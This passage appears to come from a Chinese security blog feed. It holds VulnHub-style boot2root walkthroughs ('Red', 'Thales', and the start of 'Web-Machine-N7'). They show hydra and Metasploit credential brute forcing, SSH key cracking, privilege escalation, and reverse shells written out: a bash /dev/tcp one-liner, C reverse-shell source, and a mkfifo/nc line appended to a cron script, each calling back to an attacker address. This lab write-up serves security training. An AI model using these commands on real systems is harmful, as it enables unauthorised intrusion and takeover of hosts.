'DB_NAME', 'wordpress' );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( 'DB_USER', 'john' );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( 'DB_HOST', 'localhost' );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define( 'DB_CHARSET', 'utf8' );</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don't change this if in doubt. */</span><br><span class="line">define( 'DB_COLLATE', '' );</span><br><span class="line"></span><br><span class="line">define('FS_METHOD', 'direct');</span><br><span class="line"></span><br><span class="line">define('WP_SITEURL', 'http://redrocks.win');</span><br><span class="line">define('WP_HOME', 'http://redrocks.win');</span><br><span class="line"></span><br><span class="line">/**#@+</span><br><span class="line"> * Authentication unique keys and salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases! You can generate these using</span><br><span class="line"> * the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;.</span><br><span class="line"> *</span><br><span class="line"> * You can change these at any point in time to invalidate all existing cookies.</span><br><span class="line"> * This will force all users to have to log in again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define('AUTH_KEY',         '2uuBvc8SO5&#123;&gt;UwQ&lt;^5V5[UHBw%N&#125;-BwWqw|&gt;&lt;*HfBwJ( $&amp;%,(Zbg/jwFkRHf~v|');</span><br><span class="line">define('SECURE_AUTH_KEY',  'ah&#125;&lt;I`52GL6C^@~x C9FpMq-)txgOmA&lt;~&#123;R5ktY/@.]dBF?keB3&#125;+Y^u!a54 Xc(');</span><br><span class="line">define('LOGGED_IN_KEY',    '[a!K&#125;D&lt;7-vB3Y&amp;x_&lt;3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N&#125;b&#125;R@+/$+u*pJ|Z(xu-');</span><br><span class="line">define('NONCE_KEY',        ' g4|@~:h,K29D&#125;$FL-f/eujw(VT;8wa7xRWpVR: &gt;&#125;,]!Ez.48E:ok 8Ip~5_o+a');</span><br><span class="line">define('AUTH_SALT',        'a;,O&lt;~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c');</span><br><span class="line">define('SECURE_AUTH_SALT', 'GkU:% Lo&#125; 9&#125;w38i:%]=uq&amp;J6Z&amp;RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:');</span><br><span class="line">define('LOGGED_IN_SALT',   '#`F9&amp;pm_jY&#125;N3y0&amp;8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`&lt;$9A:9&lt;Kk^L&#125;fX@+iZ');</span><br><span class="line">define('NONCE_SALT',       'hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X');</span><br><span class="line"></span><br><span class="line">/**#@-*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress database table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations in one database if you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="meta">$</span><span class="bash">table_prefix = <span class="string">'wp_'</span>;</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to true to enable the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * in their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used for debugging,</span><br><span class="line"> * visit the documentation.</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/support/article/debugging-in-wordpress/</span><br><span class="line"> */</span><br><span class="line">define( 'WP_DEBUG', false );</span><br><span class="line"></span><br><span class="line">/* Add any custom values between this line and the "stop editing" line. */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* That's all, stop editing! Happy publishing. */</span><br><span class="line"></span><br><span class="line">/** Absolute path to the WordPress directory. */</span><br><span class="line">if ( ! defined( 'ABSPATH' ) ) &#123;</span><br><span class="line">	define( 'ABSPATH', __DIR__ . '/' );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/** Sets up WordPress vars and included files. */</span><br><span class="line">require_once ABSPATH . 'wp-settings.php';</span><br></pre></td></tr></table></figure>

<ul>
<li>发现账号密码<code>john / R3v_m4lwh3r3_k1nG!!</code></li>
</ul>
<h3 id="拿到ssh"><a href="#拿到ssh" class="headerlink" title="拿到ssh"></a>拿到ssh</h3><ul>
<li><p>直接登录失败</p>
</li>
<li><p>根据提示<code>That password alone won&#39;t help you! Hashcat says rules are rules</code></p>
</li>
<li><p>使用<code>hashcat</code>生成社工库属性密码</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\usr\share\hashcat\rules&gt; ls -la                                          </span><br><span class="line">total 2588</span><br><span class="line">drwxr-xr-x 3 root root   4096 Jul 20 20:05 .</span><br><span class="line">drwxr-xr-x 7 root root   4096 Jul 20 20:05 ..</span><br><span class="line">-rw-r--r-- 1 root root    933 Jul 31  2020 best64.rule</span><br><span class="line">-rw-r--r-- 1 root root    633 Jul 31  2020 combinator.rule</span><br><span class="line">-rw-r--r-- 1 root root 200188 Jul 31  2020 d3ad0ne.rule</span><br><span class="line">-rw-r--r-- 1 root root 788063 Jul 31  2020 dive.rule</span><br><span class="line">-rw-r--r-- 1 root root 483425 Jul 31  2020 generated2.rule</span><br><span class="line">-rw-r--r-- 1 root root  78068 Jul 31  2020 generated.rule</span><br><span class="line">drwxr-xr-x 2 root root   4096 Jul 20 20:05 hybrid</span><br><span class="line">-rw-r--r-- 1 root root 309439 Jul 31  2020 Incisive-leetspeak.rule</span><br><span class="line">-rw-r--r-- 1 root root  35280 Jul 31  2020 InsidePro-HashManager.rule</span><br><span class="line">-rw-r--r-- 1 root root  19478 Jul 31  2020 InsidePro-PasswordsPro.rule</span><br><span class="line">-rw-r--r-- 1 root root    298 Jul 31  2020 leetspeak.rule</span><br><span class="line">-rw-r--r-- 1 root root   1280 Jul 31  2020 oscommerce.rule</span><br><span class="line">-rw-r--r-- 1 root root 301161 Jul 31  2020 rockyou-30000.rule</span><br><span class="line">-rw-r--r-- 1 root root   1563 Jul 31  2020 specific.rule</span><br><span class="line">-rw-r--r-- 1 root root  64068 Jul 31  2020 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule</span><br><span class="line">-rw-r--r-- 1 root root   2027 Jul 31  2020 T0XlC-insert_space_and_special_0_F.rule</span><br><span class="line">-rw-r--r-- 1 root root  34437 Jul 31  2020 T0XlC-insert_top_100_passwords_1_G.rule</span><br><span class="line">-rw-r--r-- 1 root root  34813 Jul 31  2020 T0XlC.rule</span><br><span class="line">-rw-r--r-- 1 root root 104203 Jul 31  2020 T0XlCv1.rule</span><br><span class="line">-rw-r--r-- 1 root root     45 Jul 31  2020 toggles1.rule</span><br><span class="line">-rw-r--r-- 1 root root    570 Jul 31  2020 toggles2.rule</span><br><span class="line">-rw-r--r-- 1 root root   3755 Jul 31  2020 toggles3.rule</span><br><span class="line">-rw-r--r-- 1 root root  16040 Jul 31  2020 toggles4.rule</span><br><span class="line">-rw-r--r-- 1 root root  49073 Jul 31  2020 toggles5.rule</span><br><span class="line">-rw-r--r-- 1 root root  55346 Jul 31  2020 unix-ninja-leetspeak.rule</span><br><span class="line">C:\usr\share\hashcat\rules&gt; pwd   </span><br><span class="line">/usr/share/hashcat/rules</span><br><span class="line"></span><br><span class="line">hashcat --stdout ./pass.txt -r /usr/share/hashcat/rules/best64.rule -o tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\red1&gt; wc -l tmp1.txt                                </span><br><span class="line">77 tmp1.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>hydra破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l john -P ./tmp1.txt  192.168.1.135 -t 4 ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\red1&gt; hydra -l john -P ./tmp1.txt  192.168.1.135 -t 4 ssh </span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-16 18:04:17</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 77 login tries (l:1/p:77), ~20 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.135:22/</span><br><span class="line">[22][ssh] host: 192.168.1.135   login: john   password: !!Gn1k_3r3hwl4m_v3R</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-16 18:04:21</span><br></pre></td></tr></table></figure>

<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john / !!Gn1k_3r3hwl4m_v3R</span><br><span class="line"></span><br><span class="line">ssh john@192.168.1.135</span><br></pre></td></tr></table></figure>

<ul>
<li><code>shell</code>被ban掉</li>
</ul>
<p><img data-src="./Red1/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\red1&gt; hydra -l john -P ./tmp1.txt  192.168.1.135 -t 4 ssh                                                                                                        130 ⨯</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-16 18:08:19</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 77 login tries (l:1/p:77), ~20 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.135:22/</span><br><span class="line">[22][ssh] host: 192.168.1.135   login: john   password: R3v_m4lwh3r3_k1nG!!00</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-16 18:08:33</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 密码更换为 R3v_m4lwh3r3_k1nG!!00</span></span><br></pre></td></tr></table></figure>

<ul>
<li>应该是类似定时任务，又被ban掉</li>
</ul>
<p><img data-src="./Red1/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l john -P ./tmp1.txt  192.168.1.135 -t 4 ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\red1&gt; hydra -l john -P ./tmp1.txt  192.168.1.135 -t 4 ssh                                                                                                        255 ⨯</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-16 18:12:55</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 77 login tries (l:1/p:77), ~20 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.135:22/</span><br><span class="line">[22][ssh] host: 192.168.1.135   login: john   password: R3v_m4lwh3r3_k1nG!!21</span><br></pre></td></tr></table></figure>

<ul>
<li>直接反弹shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.1.82/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img data-src="./Red1/8.png" alt></p>
<ul>
<li>提权到<code>ippsec</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u ippsec /usr/bin/time /bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Red1/9.png" alt></p>
<ul>
<li><code>pspy64</code>查看进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://192.168.1.82:8000/pspy64</span><br></pre></td></tr></table></figure>

<p><img data-src="./Red1/10.png" alt></p>
<p><img data-src="./Red1/11.png" alt></p>
<ul>
<li>修改文件，替换如下反弹shell代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;arpa/inet.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    int port = 7778;</span><br><span class="line">    struct sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    int sockt = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.82");</span><br><span class="line"></span><br><span class="line">    connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span><br><span class="line">    sizeof(revsockaddr));</span><br><span class="line">    dup2(sockt, 0);</span><br><span class="line">    dup2(sockt, 1);</span><br><span class="line">    dup2(sockt, 2);</span><br><span class="line"></span><br><span class="line">    char * const argv[] = &#123;"/bin/bash", NULL&#125;;</span><br><span class="line">    execve("/bin/bash", argv, NULL);</span><br><span class="line"></span><br><span class="line">    return 0;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./Red1/12.png" alt></p>
<p><img data-src="./Red1/13.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Red</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Red</tag>
      </tags>
  </entry>
  <entry>
    <title>Thales</title>
    <url>/2023/03/26/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Thales/</url>
    <content><![CDATA[<h1 id="Thales"><a href="#Thales" class="headerlink" title="Thales"></a>Thales</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Thales</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">not important</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.134</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.6.177</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">8080 22 open</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">not important</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页<a href="http://192.168.6.177:8080/" target="_blank" rel="noopener">http://192.168.6.177:8080/</a></li>
</ul>
<p><img data-src="./Thales/1.png" alt></p>
<h3 id="msf攻击"><a href="#msf攻击" class="headerlink" title="msf攻击"></a>msf攻击</h3><ul>
<li>尝试tomcat爆破</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login)</span><br><span class="line">set RHOSTS 192.168.6.177</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[-] 192.168.6.177:8080 - LOGIN FAILED: tomcat:admin (Incorrect)</span><br><span class="line">[-] 192.168.6.177:8080 - LOGIN FAILED: tomcat:manager (Incorrect)</span><br><span class="line">[+] 192.168.6.177:8080 - Login Successful: tomcat:role1</span><br><span class="line">[-] 192.168.6.177:8080 - LOGIN FAILED: both:admin (Incorrect)</span><br><span class="line">[-] 192.168.6.177:8080 - LOGIN FAILED: both:manager (Incorrect)</span><br></pre></td></tr></table></figure>

<ul>
<li>tomcat_mgr_upload 获取shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_upload</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">msf6 auxiliary(scanner&#x2F;http&#x2F;tomcat_mgr_login) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_upload</span><br><span class="line">[*] No payload configured, defaulting to java&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_upload):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   HttpPassword                   no        The password for the specified username</span><br><span class="line">   HttpUsername                   no        The username to authenticate as</span><br><span class="line">   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                         yes       The target host(s), see https:&#x2F;&#x2F;docs.metasploit.com&#x2F;docs&#x2F;usi</span><br><span class="line">                                            ng-metasploit&#x2F;basics&#x2F;using-metasploit.html</span><br><span class="line">   RPORT         80               yes       The target port (TCP)</span><br><span class="line">   SSL           false            no        Negotiate SSL&#x2F;TLS for outgoing connections</span><br><span class="line">   TARGETURI     &#x2F;manager         yes       The URI path of the manager app (&#x2F;html&#x2F;upload and &#x2F;undeploy</span><br><span class="line">                                            will be used)</span><br><span class="line">   VHOST                          no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.6.106    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Java Universal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; set HttpUsername tomcat</span><br><span class="line">HttpUsername &#x3D;&gt; tomcat</span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; set HttpPassword role1</span><br><span class="line">HttpPassword &#x3D;&gt; role1</span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; set RHOSTS 192.168.6.177</span><br><span class="line">RHOSTS &#x3D;&gt; 192.168.6.177</span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; set RPORT 8080</span><br><span class="line">RPORT &#x3D;&gt; 8080</span><br><span class="line">msf6 exploit(multi&#x2F;http&#x2F;tomcat_mgr_upload) &gt; expolit</span><br></pre></td></tr></table></figure>

<p><img data-src="./Thales/2.png" alt></p>
<ul>
<li>查看信息</li>
</ul>
<p><img data-src="./Thales/3.png" alt></p>
<h3 id="获取thales用户权限"><a href="#获取thales用户权限" class="headerlink" title="获取thales用户权限"></a>获取thales用户权限</h3><ul>
<li>下载用户私钥</li>
</ul>
<p><img data-src="./Thales/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">download id_rsa /root/Desktop</span><br></pre></td></tr></table></figure>

<ul>
<li>本地爆破解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">locate ssh2john</span><br><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; temp_ssh</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt temp_ssh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Thales/5.png" alt></p>
<ul>
<li>切换用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su thales vodka06</span><br></pre></td></tr></table></figure>

<p><img data-src="./Thales/6.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.6.106 8888 &gt;/tmp/f" &gt;&gt;backup.sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Thales/7.png" alt></p>
<p><img data-src="./Thales/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Thales</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Thales</tag>
      </tags>
  </entry>
  <entry>
    <title>Web-Machine-N7</title>
    <url>/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Web-Machine-N7/</url>
    <content><![CDATA[<h1 id="Web-Machine-N7"><a href="#Web-Machine-N7" class="headerlink" title="Web-Machine-N7"></a>Web-Machine-N7</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Web-Machine-N7</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Web-Machine-N7&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.236   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.236</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.236</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Web-Machine-N7&gt; nmap -sV -A -p 1-65535 192.168.1.236</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 17:49 EST</span><br><span class="line">Nmap scan report for kali.lan (192.168.1.236)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.23 ms kali.lan (192.168.1.236)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Web-Machine-N7&gt; gobuster dir -u http://192.168.1.236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.236/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/12 17:49:51 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 1620]</span><br><span class="line">/profile.php          (Status: 200) [Size: 1473]</span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.1.236/javascript/]</span><br><span class="line">/exploit.html         (Status: 200) [Size: 279]                                       </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/12 17:52:16 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Web-Machine-N7/1.png" alt></p>
<ul>
<li><code>/exploit.html</code></li>
</ul>
<p><img data-src="./Web-Machine-N7/2.png" alt></p>
<ul>
<li>发现奇怪的东西</li>
</ul>
<p><img data-src="./Web-Machine-N7/3.png" alt></p>
<h3 id="enter-network界面"><a href="#enter-network界面" class="headerlink" title="enter_network界面"></a>enter_network界面</h3><ul>
<li>发现如下界面</li>
</ul>
<p><img data-src="./Web-Machine-N7/4.png" alt></p>
<ul>
<li>发现<code>sql</code>注入</li>
</ul>
<p><img data-src="./Web-Machine-N7/5.png" alt></p>
<ul>
<li><code>sqlmap</code></li>
</ul>
